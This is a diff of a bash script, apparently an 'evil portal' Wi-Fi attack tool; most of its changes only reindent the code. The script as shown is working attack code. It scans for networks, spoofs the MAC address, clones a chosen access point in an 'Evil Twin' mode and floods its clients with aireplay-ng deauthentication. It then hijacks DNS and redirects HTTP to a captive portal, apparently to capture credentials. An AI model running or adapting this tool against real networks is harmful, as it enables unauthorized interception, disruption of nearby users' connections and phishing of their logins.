@@ -3,7 +3,7 @@
 tempFolder="/tmp/evilportal"
 
 titulo () {
-        echo "
+	echo "
 ███████╗██╗   ██╗██╗██╗
 ██╔════╝██║   ██║██║██║
 █████╗  ██║   ██║██║██║
@@ -21,76 +21,76 @@ titulo () {
 }
 
 selectNetworkInterface () {
-        nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
-        nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)
+	nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
+	nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)
 
-        if [ $nInterfaces -eq 1 ]
-        then
-                echo "[-] Configuring network interface..."
-                if [ $nMonInterfaces -eq 0 ]
-                then
+	if [ $nInterfaces -eq 1 ]
+	then
+		echo "[-] Configuring network interface..."
+		if [ $nMonInterfaces -eq 0 ]
+		then
                         tempInterface=$(airmon-ng | grep -oiE 'wlan[0-9]')
                         tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                         if [ "$tempStatus" != "enabled" ]
                         then
-                                echo "[x] Network interface couldn't be put in monitor mode"
-                                ok=0
+			        echo "[x] Network interface couldn't be put in monitor mode"
+                               	ok=0
                         else
-                                interface="$tempInterface"mon
-                                ok=1
-                        fi
-                else
-                        interface=$(airmon-ng | grep -oiE 'wlan[0-9]mon')
+				interface="$tempInterface"mon
+	                        ok=1
+			fi
+		else
+			interface=$(airmon-ng | grep -oiE 'wlan[0-9]mon')
                         ok=1
-                fi
-        elif [ $nInterfaces -gt 1 ]
-        then
-                echo
-                echo "Network interfaces:"
-                echo
-                line=4
-                i=1
+		fi
+	elif [ $nInterfaces -gt 1 ]
+	then
+		echo
+		echo "Network interfaces:"
+		echo
+		line=4
+		i=1
 
-                interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "  " -f 2)
-                while [ ${interface[$i]} ]
-                do
-                        printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
-                        line=$(( $line + 1 ))
-                        i=$(( $i + 1 ))
-                        interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "  " -f 2)
-                done
-                echo
-                echo -n "Select a network interface > "
-                read op
-                echo
-                echo "[-] Configuring network interface..."
+		interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
+		while [ ${interface[$i]} ]
+		do
+			printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
+			line=$(( $line + 1 ))
+                       	i=$(( $i + 1 ))
+			interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
+		done
+		echo
+		echo -n "Select a network interface > "
+		read op
+		echo
+		echo "[-] Configuring network interface..."
 
-                tempInterface=${interface[$op]}
-                substring=$(echo $tempInterface | grep "mon")
-                if [ $substring ]
-                then
-                        interface="$tempInterface"
-                        ok=1
-                else
-                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
-                        if [ "$tempStatus" != "enabled" ]
-                        then
-                                echo "[x] Selected network interface couldn't be put in monitor mode"
-                                ok=0
-                        else
-                                interface="$tempInterface"mon
-                                ok=1
-                        fi
-                fi
-        else
-                echo "[x] No network interface found"
-                echo
-                ok=0
-        fi
+		tempInterface=${interface[$op]}
+		substring=$(echo $tempInterface | grep "mon")
+		if [ $substring ]
+		then
+			interface="$tempInterface"
+	                ok=1
+		else
+			tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
+			if [ "$tempStatus" != "enabled" ]
+			then
+				echo "[x] Selected network interface couldn't be put in monitor mode"
+				ok=0
+			else
+				interface="$tempInterface"mon
+		                ok=1
+			fi
+		fi
+	else
+		echo "[x] No network interface found"
+		echo
+		ok=0
+	fi
 
-        if [ $ok -eq 1 ]
-        then
-                echo "[-] Upgrading network interface..."
+	if [ $ok -eq 1 ]
+	then
+		echo "[-] Upgrading network interface..."
                 ifconfig $interface down
                 iw reg set US
                 echo "[+] Network interface upgraded"
@@ -100,13 +100,13 @@ selectNetworkInterface () {
                 ifconfig $interface up
                 echo "[+] MAC address changed"
 
-                echo "[+] Network interface succesfully configured"
-                echo
-        fi
+		echo "[+] Network interface succesfully configured"
+		echo
+	fi
 }
 
 selectNetworkInterface2 () {
-        echo "[-] Configuring network interface..."
+	echo "[-] Configuring network interface..."
         nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
         nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)
 
@@ -126,28 +126,28 @@ selectNetworkInterface2 () {
                         fi
                 else
                         interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 1p)
-                        if [ "$1" = "$interface2" ]
+			if [ "$1" = "$interface2" ]
                         then
                                 interface2=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | sed -n 2p)
                         fi
                         ok=1
                 fi
         elif [ $nInterfaces -ge 3 ]
-        then
-                echo
+	then
+		echo
                 echo "Network interfaces:"
                 echo
                 line=4
                 i=1
 
-                interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "  " -f 2)
-                while [ ${interface[$i]} ]
-                do
-                        printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
-                        line=$(( $line + 1 ))
-                        i=$(( $i + 1 ))
-                        interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "  " -f 2)
-                done
+		interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
+		while [ ${interface[$i]} ]
+		do
+			printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
+			line=$(( $line + 1 ))
+                       	i=$(( $i + 1 ))
+			interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
+		done
                 echo
                 echo -n "Select a network interface > "
                 read op
@@ -171,15 +171,15 @@ selectNetworkInterface2 () {
                                 ok=1
                         fi
                 fi
-        else
+	else
                 echo "[x] Not enough network interfaces found (2)"
-                echo
-                ok=0
-        fi
+		echo
+        	ok=0
+	fi
 
         if [ $ok -eq 1 ]
         then
-                echo "[-] Upgrading network interface..."
+		echo "[-] Upgrading network interface..."
                 ifconfig $interface2 down
                 iw reg set US
                 echo "[+] Network interface upgraded"
@@ -190,93 +190,93 @@ selectNetworkInterface2 () {
                 echo "[+] MAC address changed"
 
                 echo "[+] Network interface succesfully configured"
-                echo
-        fi
+		echo
+	fi
 
 }
 
 selectNetwork () {
-        network=0
-        while [ $network -eq 0 ]
-        do
-                read -p "Seconds to scann for networks [default is 10]> " t
+	network=0
+	while [ $network -eq 0 ]
+	do
+		read -p "Seconds to scann for networks [default is 10]> " t
 
-                rm $tempFolder/temporal-01.kismet.netxml 2>/dev/null
+		rm $tempFolder/temporal-01.kismet.netxml 2>/dev/null
 
-                screen -d -m airodump-ng -w $tempFolder/temporal --output-format netxml $interface
+	        screen -d -m airodump-ng -w $tempFolder/temporal --output-format netxml $interface
 
-                if [ -z $t ]
-                then
-                        t=10
-                fi
+		if [ -z $t ]
+		then
+	        	t=10
+		fi
 
-                echo
-                echo "[-] Scanning for networks ($t seconds)..."
-                sleep $t
-                pkill airodump-ng
+		echo
+		echo "[-] Scanning for networks ($t seconds)..."
+	        sleep $t
+	        pkill airodump-ng
 
-		# Sometimes the parsing fails in raspbian, maybe because limiteds resources
-                num=0
-                num2=1
-                while [ $num -ne $num2 ]
-                do
-                        begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
-                        endLines=$(grep -n "</wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
+		# Parsing sometimes fails in raspbian, maybe because of the limited hardware
+		num=0
+		num2=1
+		while [ $num -ne $num2 ]
+		do
+		        begLines=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
+		        endLines=$(grep -n "</wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1)
 
-                        num=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1 | wc -l)
-                        num2=$(grep -n "</wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1 | wc -l)
+			num=$(grep -n "<wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1 | wc -l)
+			num2=$(grep -n "</wireless-network" $tempFolder/temporal-01.kismet.netxml | cut -d ":" -f 1 | wc -l)
 
-                        if [ $num -ne $num2 ]
-                        then
-                                echo "[x] Failed to parse scan. Retrying..."
-                        fi
-                done
+			if [ $num -ne $num2 ]
+			then
+				echo "[x] Failed to parse scan. Retrying..."
+			fi
+		done
 
-                i=1
-                while [ $i -le $num ]
-                do
-                        beg=$( echo $begLines | cut -d " " -f $i )
-                        end=$( echo $endLines | cut -d " " -f $i )
+	        i=1
+	        while [ $i -le $num ]
+	        do
+	                beg=$( echo $begLines | cut -d " " -f $i )
+	                end=$( echo $endLines | cut -d " " -f $i )
 
-                        tusers[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep "<wireless-client" | wc -l)
-                        tbssid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID | cut -d ">" -f 2 | cut -d "<" -f 1)
-                        tessid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep essid | cut -d ">" -f 2 | cut -d "<" -f 1)
-                        tchannel[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
-                        tencr[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep encryption -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
+	                tusers[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep "<wireless-client" | wc -l)
+	                tbssid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep BSSID | cut -d ">" -f 2 | cut -d "<" -f 1)
+	                tessid[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep essid | cut -d ">" -f 2 | cut -d "<" -f 1)
+	                tchannel[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep channel -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
+	                tencr[$i]=$(sed -n "$beg","$end"p $tempFolder/temporal-01.kismet.netxml | grep encryption -m 1 | cut -d ">" -f 2 | cut -d "<" -f 1)
 
-                        if [ -z "${tessid[$i]}" ]
-                        then
-                                tessid[$i]="Unknown"
-                        fi
+	                if [ -z "${tessid[$i]}" ]
+	                then
+	                        tessid[$i]="Unknown"
+	                fi
 
-                        if [ $(echo "${tencr[$i]}" | grep "WPA") ]
-                        then
-                                tencr[$i]="WPA"
-                        elif [ $(echo "${tencr[$i]}" | grep "None") ]
-                        then
-                                tencr[$i]="OPN"
-                        else
-                                tencr[$i]="---"
-                        fi
+	                if [ $(echo "${tencr[$i]}" | grep "WPA") ]
+	                then
+	                        tencr[$i]="WPA"
+	                elif [ $(echo "${tencr[$i]}" | grep "None") ]
+	                then
+	                        tencr[$i]="OPN"
+	                else
+	                        tencr[$i]="---"
+	                fi
 
-                        i=$(( $i + 1 ))
-                done
+	                i=$(( $i + 1 ))
+	        done
 
-                echo "WIFI NETWORKS"
-                echo "Network interface: $interface"
-                echo "+-----+-----+---+--------------------------+"
-                echo "|  i  | ENC |CLI|     ESSID                |"
-                echo "+-----+-----+---+--------------------------+"
-                i=1
-                while [ $i -le $num ]
-                do
-                        printf  '%1s %-3d %1s %-3s %1s %-1d %1s %-24.24s %1s\n'  "|" "$i" "|" "${tencr[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
-                        i=$(( $i + 1 ))
-                done
-                echo "+-----+-----+---+--------------------------+"
-                echo
-                read -p "Select a network [0 to repeat scann]> " network
-        done
+	        echo "WIFI NETWORKS"
+	        echo "Network interface: $interface"
+		echo "+-----+-----+---+--------------------------+"
+	        echo "|  i  | ENC |CLI|     ESSID                |"
+	        echo "+-----+-----+---+--------------------------+"
+	        i=1
+	        while [ $i -le $num ]
+	        do
+	                printf  '%1s %-3d %1s %-3s %1s %-1d %1s %-24.24s %1s\n'  "|" "$i" "|" "${tencr[$i]}" "|" "${tusers[$i]}" "|" "${tessid[$i]}" "|"
+	                i=$(( $i + 1 ))
+	        done
+		echo "+-----+-----+---+--------------------------+"
+	        echo
+	        read -p "Select a network [0 to repeat scann]> " network
+	done
 
         bssid=${tbssid[$network]}
         essid=${tessid[$network]}
@@ -286,7 +286,7 @@ selectNetwork () {
 }
 
 deauth(){
-        iwconfig "$3" channel "$2"
+	iwconfig "$3" channel "$2"
         sleep 3
         aireplay-ng -0 0 -a "$1" "$3" >/dev/null &
 }
@@ -295,92 +295,92 @@ titulo
 
 if [ $EUID -ne 0 ]
 then
-        echo "[x] Please, run script as root"
+	echo "[x] Please, run script as root"
 else
 
 ################################ PROGRAMS NEEDED ####################################
 
-        echo "[-] Updating packages..."
-        apt-get install -y hostapd apache2 dnsmasq aircrack-ng macchanger mariadb-server screen
-        rm -r $tempFolder 2>/dev/null
-        mkdir $tempFolder 2>/dev/null
-        echo "[+] All packages updated"
+	echo "[-] Updating packages..."
+	apt-get install -y hostapd apache2 dnsmasq aircrack-ng macchanger mariadb-server screen
+	rm -r $tempFolder 2>/dev/null
+	mkdir $tempFolder 2>/dev/null
+	echo "[+] All packages updated"
 
 
-        selectNetworkInterface
-        if [ $ok -eq 1 ]
-        then
+	selectNetworkInterface
+	if [ $ok -eq 1 ]
+	then
 
 ######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################
 
-                echo "[-] Flushing iptables..."
-                iptables -F
-                iptables -t nat -F
-                echo "[+] Iptables flushed"
+		echo "[-] Flushing iptables..."
+		iptables -F
+		iptables -t nat -F
+		echo "[+] Iptables flushed"
 
 ################################# HOSTAPD CONFIG #####################################
 
-                op=-1
-                while [ $op -lt 0 ] || [ $op -gt 2 ]
-                do
-                        echo
-                        echo "Mode:"
-                        echo "[1] -> Create new acces point"
-                        echo "[2] -> [Evil Twin] Intercept existing access point"
-                        read -p "> " op
-                        echo
+		op=-1
+	        while [ $op -lt 0 ] || [ $op -gt 2 ]
+	        do
+	                echo
+			echo "Mode:"
+	                echo "[1] -> Create new acces point"
+	                echo "[2] -> [Evil Twin] Intercept existing access point"
+	                read -p "> " op
+			echo
 
-                        if [ $op -lt 0 ] || [ $op -gt 2 ]
-                        then
-                                echo "[x] Please, select a valid option: "
-                        fi
-                done
+	                if [ $op -lt 0 ] || [ $op -gt 2 ]
+	                then
+	                        echo "[x] Please, select a valid option: "
+	                fi
+	        done
 
-                if [ $op -eq 1 ]
-                then
-                        deauth=0
-                        read -p "Wifi essid > " essid
-                        read -p "Channel > " channel
-                        echo
-                        op=-1
-                        echo "Security: "
-                        while [ $op -lt 0 ] || [ $op -gt 2 ]
-                        do
-                                echo "[1] -> Open"
-                                echo "[2] -> WPA2"
-                                read -p "> " op
-                                echo
+	        if [ $op -eq 1 ]
+	        then
+	                deauth=0
+	                read -p "Wifi essid > " essid
+	                read -p "Channel > " channel
+			echo
+			op=-1
+			echo "Security: "
+	        	while [ $op -lt 0 ] || [ $op -gt 2 ]
+	        	do
+	                	echo "[1] -> Open"
+		                echo "[2] -> WPA2"
+	        	        read -p "> " op
+				echo
 
-                                if [ $op -lt 1 ] || [ $op -gt 2 ]
-                                then
-                                        echo "Please, select a valid option: "
-                                fi
+	                	if [ $op -lt 1 ] || [ $op -gt 2 ]
+	                	then
+	                        	echo "Please, select a valid option: "
+	                	fi
 
-                                if [ $op -eq 1 ]
-                                then
-                                        encr="OPEN"
-                                else
-                                        encr="WPA"
-                                fi
+				if [ $op -eq 1 ]
+				then
+					encr="OPEN"
+				else
+					encr="WPA"
+				fi
 
-                        done
-                elif [ $op -eq 2 ]
-                then
-                        deauth=1
-                        selectNetworkInterface2 $interface
-                        if [ $ok -eq 1 ]
-                        then
-                                selectNetwork
-                        fi
-                fi
+	        	done
+		elif [ $op -eq 2 ]
+	        then
+	                deauth=1
+			selectNetworkInterface2 $interface
+	                if [ $ok -eq 1 ]
+			then
+				selectNetwork
+	        	fi
+		fi
 
-                if [ $ok -eq 1 ]
-                then
+		if [ $ok -eq 1 ]
+		then
 
-                        if [ "$encr" = "OPEN" ]
-                        then
+		        if [ "$encr" = "OPEN" ]
+		        then
 
-                                echo "interface=$interface
+		                echo "interface=$interface
 driver=nl80211
 ssid=$essid
 hw_mode=g
@@ -389,12 +389,12 @@ macaddr_acl=0
 auth_algs=1
 ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
-                        else
+		        else
 
-                                read -p "Wifi password [more than 8 chars]> " pass
-                                echo
+		        	read -p "Wifi password [more than 8 chars]> " pass
+				echo
 
-                                echo "interface=$interface
+		        	echo "interface=$interface
 driver=nl80211
 ssid=$essid
 hw_mode=g
@@ -408,25 +408,25 @@ macaddr_acl=0
 auth_algs=3
 ignore_broadcast_ssid=0" > $tempFolder/hostapd.conf
 
-                        fi
+		        fi
 
-                        echo "[-] Configuring access point..."
+			echo "[-] Configuring access point..."
 
 
-                        hostapd $tempFolder/hostapd.conf > $tempFolder/hostapd.log &
+			hostapd $tempFolder/hostapd.conf > $tempFolder/hostapd.log &
 
 ########################## DNSMASQ CONFIG (DNS & DHCP) ###############################
 
-                        # Stops dnsmasq daemon on port 53
-                        service dnsmasq stop
+			# Stops dnsmasq daemon on port 53
+			service dnsmasq stop
 
-                        # Checks for Internet connection
-                        conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')
+			# Checks for Internet connection
+			conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')
 
-                        if [ $conex -lt 100 ]
-                        then
+			if [ $conex -lt 100 ]
+			then
 
-                                echo "interface=$interface
+				echo "interface=$interface
 dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
@@ -434,17 +434,17 @@ server=8.8.8.8
 log-queries
 listen-address=127.0.0.1" > $tempFolder/dnsmasq.conf
 
-                                # IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
+				# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION
 
-                                # We redirect to 10.0.0.1:80 everything going to port 80 of this machine
-                                iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+				# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
+				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
 
-                                # Everything going out this machine goes by eth0 and masqued
-                                iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
+				# Everything going out this machine goes by eth0 and masqued
+				iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
 
-                        else
+			else
 
-                                echo "interface=$interface
+				echo "interface=$interface
 dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
 dhcp-option=3,10.0.0.1
 dhcp-option=6,10.0.0.1
@@ -453,92 +453,92 @@ log-queries
 listen-address=127.0.0.1
 address=/#/10.0.0.1" > $tempFolder/dnsmasq.conf
 
-                        fi
+			fi
 
-                        # Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
-                        # (.htaccess) can reffer directly to the domain name in the URL
-                        echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts
+			# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
+			# (.htaccess) can reffer directly to the domain name in the URL
+			echo "10.0.0.1 wifiportal2.aire.es" > $tempFolder/hosts
 
-                        ifconfig $interface 10.0.0.1
+			ifconfig $interface 10.0.0.1
 
-                        dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts
+			dnsmasq -C $tempFolder/dnsmasq.conf -H $tempFolder/hosts
 
 ################################### WEB FILES #########################################
 
-                        rm -r /var/www/html/*
-                        cp -r captive /var/www/html/captive
-                        cp .htaccess /var/www/html
-                        chmod 777 /var/www/html/.htaccess
-                        chmod 777 /var/www/html/captive
-                        chmod 777 /var/www/html/captive/*
+			rm -r /var/www/html/*
+			cp -r captive /var/www/html/captive
+			cp .htaccess /var/www/html
+			chmod 777 /var/www/html/.htaccess
+			chmod 777 /var/www/html/captive
+			chmod 777 /var/www/html/captive/*
 
-                        cp -f override.conf /etc/apache2/conf-available/
+			cp -f override.conf /etc/apache2/conf-available/
 
-                        # Enables rewrite and override for .htaccess
-                        a2enconf override
-                        a2enmod rewrite
+			# Enables rewrite and override for .htaccess
+			a2enconf override
+			a2enmod rewrite
 
-                        service apache2 reload
-                        service apache2 restart
-                        service mysql start
+			service apache2 reload
+			service apache2 restart
+			service mysql start
 
-                        if [ $deauth -eq 1 ]
-                        then
-                                deauth $bssid $channel $interface2
+			if [ $deauth -eq 1 ]
+		        then
+				deauth $bssid $channel $interface2
 
-                                while [ true ]
-                                do
-                                        echo
-                                        echo "Monitoring actions"
-                                        echo "[1] -> See hostapd logs"
-                                        echo "[2] -> Stop hostapd and dnsmasq"
-                                        echo "[3] -> Stop aireplay-ng"
-                                        read -p "> " op
-                                        echo
-                                        if [ $op -eq 1 ]
-                                        then
-                                                echo "HOSTAPD"
-                                                echo
-                                                cat $tempFolder/hostapd.log
-                                                echo
-                                        elif [ $op -eq 2 ]
-                                        then
-                                                pkill hostapd
-                                                pkill dnsmasq
-                                        elif [ $op -eq 3 ]
-                                        then
-                                                pkill aireplay-ng
-                                        elif [ $op -le 0 ] || [ $op -ge 4 ]
-                                        then
-                                                echo "[x]Please, select a valid option"
-                                        fi
-                                done
-                        fi
+				while [ true ]
+				do
+					echo
+					echo "Monitoring actions"
+					echo "[1] -> See hostapd logs"
+					echo "[2] -> Stop hostapd and dnsmasq"
+					echo "[3] -> Stop aireplay-ng"
+					read -p "> " op
+					echo
+					if [ $op -eq 1 ]
+					then
+						echo "HOSTAPD"
+						echo
+						cat $tempFolder/hostapd.log
+						echo
+					elif [ $op -eq 2 ]
+					then
+						pkill hostapd
+						pkill dnsmasq
+					elif [ $op -eq 3 ]
+					then
+						pkill aireplay-ng
+					elif [ $op -le 0 ] || [ $op -ge 4 ]
+					then
+						echo "[x]Please, select a valid option"
+					fi
+				done
+			fi
 
-                        while [ true ]
-                        do
-                                echo
-                                echo "Monitoring actions"
-                                echo "[1] -> See hostapd logs"
-                                echo "[2] -> Stop hostapd and dnsmasq"
-                                read -p "> " op
-                                echo
-                                if [ $op -eq 1 ]
-                                then
-                                        echo "HOSTAPD"
-                                        echo
-                                        cat $tempFolder/hostapd.log
-                                        echo
-                                elif [ $op -eq 2 ]
-                                then
-                                        pkill hostapd
-                                        pkill dnsmasq
-                                elif [ $op -le 0 ] || [ $op -ge 3 ]
-                                then
-                                        echo "[x]Please, select a valid option"
-                                fi
-                        done
-                fi
-        fi
+			while [ true ]
+			do
+				echo
+				echo "Monitoring actions"
+				echo "[1] -> See hostapd logs"
+				echo "[2] -> Stop hostapd and dnsmasq"
+				read -p "> " op
+				echo
+				if [ $op -eq 1 ]
+				then
+					echo "HOSTAPD"
+					echo
+					cat $tempFolder/hostapd.log
+					echo
+				elif [ $op -eq 2 ]
+				then
+					pkill hostapd
+					pkill dnsmasq
+				elif [ $op -le 0 ] || [ $op -ge 3 ]
+				then
+					echo "[x]Please, select a valid option"
+				fi
+			done
+		fi
+	fi
 fi
 echo
